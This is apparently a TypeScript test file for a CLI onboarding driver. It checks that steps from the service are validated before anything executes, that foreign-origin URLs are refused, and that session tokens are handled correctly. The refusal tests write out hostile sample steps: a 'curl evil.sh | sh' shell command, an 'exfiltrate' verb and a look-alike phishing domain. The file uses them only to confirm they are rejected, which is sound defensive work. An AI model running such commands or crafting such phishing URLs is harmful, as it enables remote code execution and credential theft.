/**
 * The driver loop, against a fake service.
 *
 * The point of these is not that the happy path works — it is that the loop
 * cannot be talked into doing something it should not:
 *
 *   - a step is validated BEFORE any executor is reached, so a bad step means
 *     zero side effects, not "one executor ran and then we noticed";
 *   - a URL on another origin is refused even though everything else about the
 *     step is well-formed;
 *   - observations are re-read every iteration rather than carried over;
 *   - local-only mode never reaches the service at all.
 *
 * Executors are injected, so nothing here authenticates, writes or shells out.
 */
import { describe, test, expect, mock, afterEach, afterAll } from 'bun:test';
import { mkdtempSync, rmSync } from 'fs';
import { join } from 'path';

// CAP-451's broker-ceremony test writes a real (isolated) session file
// through FileSessionStorageBackend — pin HOME to a throwaway tmpdir first,
// same convention as tests/flows/observe.test.ts / sessionLifecycle.test.ts.
// getGlobalCapyDir() reads os.homedir() lazily at call time, so this mock
// works regardless of when driver.ts itself was imported.
const tempHome = mkdtempSync(join(require('os').tmpdir(), 'capy-driver-ceremony-'));
mock.module('os', () => {
  const actual = require('os');
  return { ...actual, homedir: () => tempHome };
});
afterAll(() => {
  mock.restore();
  rmSync(tempHome, { recursive: true, force: true });
});

import { runOnboardFlow } from '../../src/flows/onboard/driver';
import { FLOW_CONTRACT_VERSION, FlowContractError, FLOW_ERROR_CODES } from '../../src/flows/validate';
import { ExecutorMap, StepResult } from '../../src/flows/onboard/executors';
import { CreateFlowRequest, FlowTransport, NextRequest } from '../../src/flows/client';
import { OnboardObservations } from '../../src/flows/onboard/observe';
import { mintConnectionKeypair } from '../../src/service/brokerEnvelope';
import { sealEnvelopePageSide } from '../helpers/sealEnvelope';
import { keepOrigin } from '../../src/ui/screens/keepScreens';

const FLOW_ID = 'flow-1';

function envelope(over: Record<string, unknown>): Record<string, unknown> {
  return {
    contract_version: FLOW_CONTRACT_VERSION,
    flow_id: FLOW_ID,
    flow_type: 'onboard',
    step_id: `s-${Math.random().toString(36).slice(2, 8)}`,
    resumed: false,
    params: {},
    ...over,
  };
}

const OBS: OnboardObservations = {
  targetDirValid: true,
  hasCapyDir: false,
  hasKeepLock: false,
  envMetaRecoverable: false,
  envStillPlaintext: true,
  commandsWrapped: false,
  branchConflict: false,
  sessionLive: false,
  orgKeyOnDevice: true,
};

/** A fake service that hands back a scripted sequence and records what it was told. */
function fakeTransport(steps: Array<Record<string, unknown>>, createStep: unknown = null) {
  const reports: NextRequest[] = [];
  const created: CreateFlowRequest[] = [];
  let i = 0;
  const transport: FlowTransport = {
    async create(body) {
      created.push(body);
      return {
        flow_id: FLOW_ID,
        flow_type: 'onboard',
        contract_version: FLOW_CONTRACT_VERSION,
        binding: 'anonymous',
        flow_secret: 'sekrit',
        step: createStep,
      };
    },
    async next(_id, body) {
      reports.push(body);
      const step = steps[Math.min(i, steps.length - 1)];
      i++;
      return { step };
    },
    async confirm() {
      return { recorded: true };
    },
    async cancel() {
      /* nothing */
    },
  };
  return { transport, reports, created, calls: () => i };
}

/** Executors that record their calls and flip nothing. */
function recordingExecutors(outcome: StepResult = { outcome: 'ok' }): { map: ExecutorMap; calls: string[] } {
  const calls: string[] = [];
  const make = (verb: string) => async () => {
    calls.push(verb);
    return outcome;
  };
  return {
    calls,
    map: {
      authenticate: make('authenticate'),
      write_capy_dir: make('write_capy_dir'),
      write_keep_lock: make('write_keep_lock'),
      wrap_run_commands: make('wrap_run_commands'),
      encrypt_env: make('encrypt_env'),
      unlock_org_key: make('unlock_org_key'),
    },
  };
}

const observeStub = (obs: Partial<OnboardObservations> = {}) => () => ({ ...OBS, ...obs });

describe('driver: the happy loop', () => {
  test('executes each local action it is given and stops on done', async () => {
    const { transport, reports } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'authenticate', params: { org_hint: null } }),
      envelope({ kind: 'local_action', verb: 'write_capy_dir', params: { branch: 'development' } }),
      envelope({ kind: 'done', params: {} }),
    ]);
    const { map, calls } = recordingExecutors();

    const result = await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
    });

    expect(calls).toEqual(['authenticate', 'write_capy_dir']);
    expect(result.step.kind).toBe('done');
    expect(result.executed.map((e) => e.verb)).toEqual(['authenticate', 'write_capy_dir']);
    // Fresh observations every pass — the reconciler is level-triggered.
    expect(reports.length).toBe(3);
    expect(reports[0].observations).toEqual(OBS);
  });

  test('reports the previous step outcome, with the ids it resolved', async () => {
    const { transport, reports } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'write_keep_lock', params: { source: 'select_or_create', consent_recorded: true } }),
      envelope({ kind: 'done', params: {} }),
    ]);
    const map: ExecutorMap = {
      write_keep_lock: async () => ({ outcome: 'ok', result: { org_id: 'org_1', project_id: 'proj_1', branch: 'development' } }),
    };

    await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });

    expect(reports[1].last_step).toEqual({
      step_id: expect.any(String),
      outcome: 'ok',
      code: undefined,
      result: { org_id: 'org_1', project_id: 'proj_1', branch: 'development' },
    });
  });

  test('reports a failure by CODE, and lets the service decide what it means', async () => {
    const { transport, reports } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'authenticate', params: {} }),
      envelope({ kind: 'blocked', reason: 'key_not_on_device', params: {} }),
    ]);
    const map: ExecutorMap = { authenticate: async () => ({ outcome: 'failed', code: 'KEY_NOT_ON_DEVICE' }) };

    const result = await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });

    expect(reports[1].last_step?.code).toBe('KEY_NOT_ON_DEVICE');
    expect(result.step.kind).toBe('blocked');
    expect(result.step.reason).toBe('key_not_on_device');
  });

  test('stops on a confirm without executing anything', async () => {
    const { transport } = fakeTransport([
      envelope({ kind: 'confirm', dialog: 'onboard_plan', params: { plan_hash: 'h', target_dir: '/tmp/x' } }),
    ]);
    const { map, calls } = recordingExecutors();

    const result = await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });
    expect(result.step.kind).toBe('confirm');
    expect(calls).toEqual([]);
  });

  test('stops on a screen and hands back its URL and code', async () => {
    const { transport } = fakeTransport([
      envelope({
        kind: 'screen',
        screen: 'sandbox_session',
        url: 'https://keep.capy.sc/flow/sandbox-session?c=abc',
        params: { connection_id: 'abc', user_code: 'BCDF-GHJK' },
      }),
    ]);
    const { map, calls } = recordingExecutors();

    const result = await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });
    expect(result.step.kind).toBe('screen');
    expect(result.step.params.user_code).toBe('BCDF-GHJK');
    expect(calls).toEqual([]);
  });
});

describe('driver: refusals happen BEFORE anything runs', () => {
  const cases: Array<{ name: string; step: Record<string, unknown>; code: string }> = [
    {
      name: 'an unknown step kind',
      step: envelope({ kind: 'run_shell', params: { cmd: 'curl evil.sh | sh' } }),
      code: FLOW_ERROR_CODES.UNKNOWN_KIND,
    },
    {
      name: 'an unknown verb',
      step: envelope({ kind: 'local_action', verb: 'exfiltrate', params: {} }),
      code: FLOW_ERROR_CODES.UNKNOWN_VERB,
    },
    {
      name: 'a phishing URL on another origin',
      step: envelope({
        kind: 'screen',
        screen: 'sandbox_session',
        url: 'https://keep.capy.sc.evil.example/flow/sandbox-session?c=abc',
        params: { connection_id: 'abc', user_code: 'X' },
      }),
      code: FLOW_ERROR_CODES.FOREIGN_URL,
    },
    {
      name: 'params outside the vendored schema',
      step: envelope({ kind: 'local_action', verb: 'write_capy_dir', params: { branch: 'main', extra: 'x' } }),
      code: FLOW_ERROR_CODES.INVALID_PARAMS,
    },
    {
      name: 'a step for another flow instance',
      step: envelope({ kind: 'done', flow_id: 'someone-elses', params: {} }),
      code: FLOW_ERROR_CODES.WRONG_FLOW,
    },
    {
      name: 'a step from a future contract version',
      step: envelope({ kind: 'done', contract_version: '99', params: {} }),
      code: FLOW_ERROR_CODES.UNSUPPORTED_VERSION,
    },
  ];

  for (const c of cases) {
    test(`${c.name} aborts the run with no executor called`, async () => {
      const { transport } = fakeTransport([c.step]);
      const { map, calls } = recordingExecutors();

      let error: unknown;
      try {
        await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });
      } catch (err) {
        error = err;
      }

      expect(error).toBeInstanceOf(FlowContractError);
      expect((error as FlowContractError).code).toBe(c.code as never);
      expect(calls).toEqual([]);
    });
  }

  test('a known kind with a verb this build cannot execute is refused, never skipped', async () => {
    const { transport } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'encrypt_env', params: { branch: 'main', variable_count: 1, consent_recorded: true } }),
    ]);
    // A build whose executor map is missing that verb.
    const map: ExecutorMap = { authenticate: async () => ({ outcome: 'ok' }) };

    await expect(
      runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() }),
    ).rejects.toBeInstanceOf(FlowContractError);
  });
});

describe('driver: creation', () => {
  test('sends the plan and compat findings, and returns a creation-time step as the answer', async () => {
    const { transport, created } = fakeTransport(
      [envelope({ kind: 'done', params: {} })],
      envelope({ kind: 'blocked', reason: 'incompatible_project', params: {} }),
    );
    const { map, calls } = recordingExecutors();

    const result = await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
      plan: { plan_hash: 'h' },
      compat: { usesEnvVars: false },
    });

    expect(created[0].compat).toEqual({ usesEnvVars: false });
    expect(created[0].contract_version).toBe(FLOW_CONTRACT_VERSION);
    expect(result.step.reason).toBe('incompatible_project');
    expect(calls).toEqual([]);
  });

  test('hands the one-time secret back to the caller and never writes it anywhere', async () => {
    const { transport } = fakeTransport([envelope({ kind: 'done', params: {} })]);
    const result = await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: recordingExecutors().map,
      observe: observeStub(),
    });
    expect(result.flowSecret).toBe('sekrit');
  });

  test('refuses to spin forever when the service keeps handing back work', async () => {
    const { transport } = fakeTransport([envelope({ kind: 'local_action', verb: 'authenticate', params: {} })]);
    await expect(
      runOnboardFlow({
        targetDir: '/tmp/x',
        transport,
        executors: recordingExecutors().map,
        observe: observeStub(),
        maxSteps: 3,
      }),
    ).rejects.toThrow();
  });
});

describe('G1 — a token minted mid-flow travels on the next request', () => {
  test('the request AFTER a successful authenticate carries it; the one before does not', async () => {
    const seen: Array<string | undefined> = [];
    let signedIn = false;
    const transport: FlowTransport = {
      async create() {
        return {
          flow_id: FLOW_ID,
          flow_type: 'onboard',
          contract_version: FLOW_CONTRACT_VERSION,
          binding: 'anonymous',
          flow_secret: 'sekrit',
          step: null,
        };
      },
      async next(_id, _body, creds) {
        seen.push(creds.token);
        return {
          step: seen.length === 1
            ? envelope({ kind: 'local_action', verb: 'authenticate', params: {} })
            : envelope({ kind: 'done', params: {} }),
        };
      },
      async confirm() {
        return {};
      },
      async cancel() {},
    };

    const map: ExecutorMap = {
      authenticate: async () => {
        signedIn = true;
        return { outcome: 'ok' };
      },
    };

    await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
      getToken: async () => (signedIn ? 'jwt-after-auth' : undefined),
    });

    expect(seen).toEqual([undefined, 'jwt-after-auth']);
  });

  test('a FAILED step does not promote a token', async () => {
    const seen: Array<string | undefined> = [];
    const transport: FlowTransport = {
      async create() {
        return { flow_id: FLOW_ID, flow_type: 'onboard', contract_version: FLOW_CONTRACT_VERSION, binding: 'anonymous', step: null };
      },
      async next(_id, _body, creds) {
        seen.push(creds.token);
        return {
          step: seen.length === 1
            ? envelope({ kind: 'local_action', verb: 'authenticate', params: {} })
            : envelope({ kind: 'blocked', reason: 'auth_declined', params: {} }),
        };
      },
      async confirm() {
        return {};
      },
      async cancel() {},
    };
    await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: { authenticate: async () => ({ outcome: 'failed', code: 'AUTH_FAILED' }) },
      observe: observeStub(),
      getToken: async () => 'should-not-be-used',
    });
    expect(seen).toEqual([undefined, undefined]);
  });

  // HANDOFF bug B, CLI side: `authenticate` runs before the caller has an org
  // (org-less mint), but `write_keep_lock` selects/creates one — after which
  // `getToken()` (scoped via sync-state user_id) resolves to the FRESH,
  // org-scoped session, not the org-less one `authenticate` minted. The old
  // `mintedToken ?? (await getToken())` kept shadowing it with the stale one
  // for the rest of the run, which is exactly what sent the org-less bearer
  // into the pin check that 403'd.
  test('a token getToken() resolves AFTER write_keep_lock wins over the one authenticate minted', async () => {
    const seen: Array<string | undefined> = [];
    let orgCreated = false;
    const transport: FlowTransport = {
      async create() {
        return { flow_id: FLOW_ID, flow_type: 'onboard', contract_version: FLOW_CONTRACT_VERSION, binding: 'anonymous', flow_secret: 'sekrit', step: null };
      },
      async next(_id, _body, creds) {
        seen.push(creds.token);
        if (seen.length === 1) return { step: envelope({ kind: 'local_action', verb: 'authenticate', params: {} }) };
        if (seen.length === 2) {
          return {
            step: envelope({
              kind: 'local_action',
              verb: 'write_keep_lock',
              params: { source: 'select_or_create', consent_recorded: true },
            }),
          };
        }
        return { step: envelope({ kind: 'done', params: {} }) };
      },
      async confirm() { return {}; },
      async cancel() {},
    };
    const map: ExecutorMap = {
      authenticate: async (_step, ctx) => {
        // Mints an ORG-LESS session — exactly what a brand-new identity gets.
        ctx.onSession?.({ token: 'orgless-token', userId: 'user_1' });
        return { outcome: 'ok' };
      },
      write_keep_lock: async () => {
        orgCreated = true;
        return { outcome: 'ok', result: { org_id: 'org_1', project_id: 'proj_1' } };
      },
    };

    await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
      // Scoped exactly the way the real getToken (AuthService, keyed by
      // sync-state user_id) behaves: nothing until an org exists, then the
      // real org-scoped session.
      getToken: async () => (orgCreated ? 'org-scoped-token' : undefined),
    });

    // step 1 (authenticate) carries nothing; step 2 (write_keep_lock) carries
    // the org-less token authenticate minted (getToken() has nothing yet);
    // step 3 (done) carries the FRESH org-scoped token, not the stale org-less one.
    expect(seen).toEqual([undefined, 'orgless-token', 'org-scoped-token']);
  });
});

describe('BUG A — ctx.consented is set from the step, per step, not fixed at false', () => {
  test('the executor sees consented=true exactly when the step says consent_recorded=true', async () => {
    const seenConsented: boolean[] = [];
    const { transport } = fakeTransport([
      envelope({
        kind: 'local_action',
        verb: 'write_keep_lock',
        params: { source: 'env_header', consent_recorded: false },
      }),
      envelope({
        kind: 'local_action',
        verb: 'wrap_run_commands',
        params: { plan_hash: 'h', kinds: ['run-wrap'], consent_recorded: true },
      }),
      envelope({ kind: 'done', params: {} }),
    ]);
    const map: ExecutorMap = {
      write_keep_lock: async (_step, ctx) => {
        seenConsented.push(ctx.consented);
        return { outcome: 'ok' };
      },
      wrap_run_commands: async (_step, ctx) => {
        seenConsented.push(ctx.consented);
        return { outcome: 'ok' };
      },
    };

    await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });

    expect(seenConsented).toEqual([false, true]);
  });
});

describe('BUG C — resumed is read from the FIRST envelope only, never OR-ed across steps', () => {
  test('a genuinely fresh run reports resumed:false even though it has, by step 2, already issued a step', async () => {
    // Every envelope in this scripted run says resumed:false — the server-side
    // fix means the SAME instance echoes the same decided value on every step,
    // but the point of this test is the DRIVER: even if it were handed a stale
    // true on a later step by a service that had not yet been fixed, the old
    // bug was ORing `step.resumed` across steps. Assert the driver reports
    // exactly the FIRST envelope's value.
    const { transport } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'authenticate', params: {}, resumed: false }),
      envelope({ kind: 'local_action', verb: 'write_capy_dir', params: { branch: 'development' }, resumed: false }),
      envelope({ kind: 'done', params: {}, resumed: false }),
    ]);
    const { map } = recordingExecutors();

    const result = await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });
    expect(result.resumed).toBe(false);
  });

  test('reports the value from the FIRST envelope even if a later one disagrees', async () => {
    const { transport } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'authenticate', params: {}, resumed: false }),
      // A later step reporting true must NOT flip the run's answer — the
      // service is supposed to echo one decided value for the whole instance,
      // and the driver's job is to trust the first one, not accumulate them.
      envelope({ kind: 'done', params: {}, resumed: true }),
    ]);
    const { map } = recordingExecutors();

    const result = await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });
    expect(result.resumed).toBe(false);
  });

  test('a run that starts already resumed reports true from its first envelope', async () => {
    const { transport } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'write_capy_dir', params: { branch: 'development' }, resumed: true }),
      envelope({ kind: 'done', params: {}, resumed: true }),
    ]);
    const { map } = recordingExecutors();

    const result = await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });
    expect(result.resumed).toBe(true);
  });
});

describe('G4 — ids resolved by a step that then failed are still reported', () => {
  test('the failed report carries the result, so the service can pin it', async () => {
    const { transport, reports } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'write_keep_lock', params: { source: 'select_or_create', consent_recorded: true } }),
      envelope({ kind: 'blocked', reason: 'service_error', params: {} }),
    ]);
    const map: ExecutorMap = {
      write_keep_lock: async () => ({
        outcome: 'failed',
        code: 'SERVICE_ERROR',
        result: { org_id: 'org_1', project_id: 'proj_1' },
      }),
    };

    await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });

    expect(reports[1].last_step).toEqual({
      step_id: expect.any(String),
      outcome: 'failed',
      code: 'SERVICE_ERROR',
      result: { org_id: 'org_1', project_id: 'proj_1' },
    });
  });
});

describe('G5 — a plan that moved under the human is resent', () => {
  test('sends the rebuilt plan only after a PLAN_CHANGED outcome', async () => {
    const { transport, reports } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'wrap_run_commands', params: { plan_hash: 'h1', kinds: ['run-wrap'], consent_recorded: true } }),
      envelope({ kind: 'blocked', reason: 'plan_changed', params: {} }),
    ]);
    const map: ExecutorMap = { wrap_run_commands: async () => ({ outcome: 'failed', code: 'PLAN_CHANGED' }) };

    await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
      buildPlan: () => ({ plan_hash: 'h2', target_dir: '/tmp/x' }),
    });

    // Not on the first report: an unchanged plan is never resent.
    expect(reports[0].plan).toBeUndefined();
    expect(reports[1].plan).toEqual({ plan_hash: 'h2', target_dir: '/tmp/x' });
  });
});

describe('CAP-451 — the in-process broker ceremony intercepts sandbox_session under --broker-ceremony', () => {
  test('a screen:sandbox_session step is answered in-process, never returned as a stop, when brokerCeremonyKeypair is set', async () => {
    const keypair = mintConnectionKeypair();
    // A fake, already-valid access token for org_1 — so applyFirstRun's own
    // authenticateSilent('org_1') call resolves from CACHE (no network),
    // keeping this test scoped to "did the driver run the ceremony and
    // continue", not a full re-test of SessionLifecycle's refresh paths
    // (those are covered in tests/auth/sessionLifecycle.test.ts).
    const fakeJwt = `${Buffer.from(JSON.stringify({ alg: 'none' })).toString('base64url')}.` +
      `${Buffer.from(JSON.stringify({ org_id: 'workos-org-1' })).toString('base64url')}.sig`;
    const answerPlaintext = JSON.stringify({
      v: 1,
      flow: 'sandbox-session',
      ok: true,
      user: { id: 'user_1', email: 'a@b.com' },
      refresh_token: 'rt-1',
      organizations: [{ id: 'org_1', workos_org_id: 'workos-org-1', name: 'Org One' }],
      sessions: { org_1: { access_token: fakeJwt, expires_at: Date.now() + 3600_000 } },
      // No first_run: the "1 org, key on device" rail.
    });
    const ciphertext = await sealEnvelopePageSide({
      plaintext: answerPlaintext,
      connectionId: 'conn-1',
      clientPubkeyB64: keypair.publicKeyB64,
    });

    const fetchCalls: string[] = [];
    const originalFetch = globalThis.fetch;
    globalThis.fetch = (async (url: any) => {
      fetchCalls.push(String(url));
      if (String(url).includes('/connections/')) {
        return new Response(JSON.stringify({ status: 'answered', ciphertext }), {
          status: 200,
          headers: { 'Content-Type': 'application/json' },
        });
      }
      throw new Error(`unexpected fetch in this test: ${url}`);
    }) as typeof fetch;

    const sandboxStep = envelope({
      kind: 'screen',
      screen: 'sandbox_session',
      url: `${keepOrigin()}/flow/sandbox-session?c=conn-1`,
      params: { connection_id: 'conn-1', user_code: 'BCDF-GHJK' },
    });
    const { transport, calls: callCount } = fakeTransport([
      sandboxStep,
      envelope({ kind: 'done', params: {} }),
    ]);
    const { map, calls } = recordingExecutors();

    let result: Awaited<ReturnType<typeof runOnboardFlow>>;
    try {
      result = await runOnboardFlow({
        targetDir: '/tmp/x',
        transport,
        executors: map,
        observe: observeStub(),
        authMode: 'broker_ceremony',
        clientPubkey: keypair.publicKeyB64,
        brokerCeremonyKeypair: keypair,
        serviceUrl: 'https://api.test.invalid',
        flowSecret: 'flow-secret-1',
      });
    } finally {
      globalThis.fetch = originalFetch;
    }

    // Never stopped on the screen — it ran through to done.
    expect(result.step.kind).toBe('done');
    // No local_action executor was reached for this step (authenticate,
    // write_capy_dir, etc.) — the ceremony handled it entirely itself.
    expect(calls).toEqual([]);
    expect(result.executed.map((e) => e.verb)).toEqual(['sandbox_ceremony']);
    expect(result.executed[0].outcome).toBe('ok');
    expect(result.executed[0].code).toBeUndefined();
    // The poll used the FLOW's own secret, never a second connection/secret.
    expect(fetchCalls[0]).toContain('/connections/conn-1/result');
    expect(callCount()).toBe(2); // sandbox_session step, then done
  });

  test('the SAME screen, with no brokerCeremonyKeypair, still stops exactly as before (additive-only)', async () => {
    const sandboxStep = envelope({
      kind: 'screen',
      screen: 'sandbox_session',
      url: `${keepOrigin()}/flow/sandbox-session?c=conn-1`,
      params: { connection_id: 'conn-1', user_code: 'BCDF-GHJK' },
    });
    const { transport } = fakeTransport([sandboxStep]);
    const { map, calls } = recordingExecutors();

    const result = await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
    });

    expect(result.step.kind).toBe('screen');
    expect(result.step.params.connection_id).toBe('conn-1');
    expect(calls).toEqual([]);
  });
});

describe('driver: local-only mode never reaches the service', () => {
  afterEach(() => {
    mock.restore();
  });

  test('refuses before creating anything', async () => {
    mock.module('../../src/config/profileConfig', () => ({
      isLocalOnly: () => true,
      resolveActiveUrl: () => 'http://localhost:3001',
    }));
    // Re-import so the driver picks up the mocked module.
    const { runOnboardFlow: driver } = await import('../../src/flows/onboard/driver');

    const { transport, created, calls } = fakeTransport([envelope({ kind: 'done', params: {} })]);
    await expect(
      driver({ targetDir: '/tmp/x', transport, executors: recordingExecutors().map, observe: observeStub() }),
    ).rejects.toThrow();
    expect(created).toEqual([]);
    expect(calls()).toBe(0);
  });
});
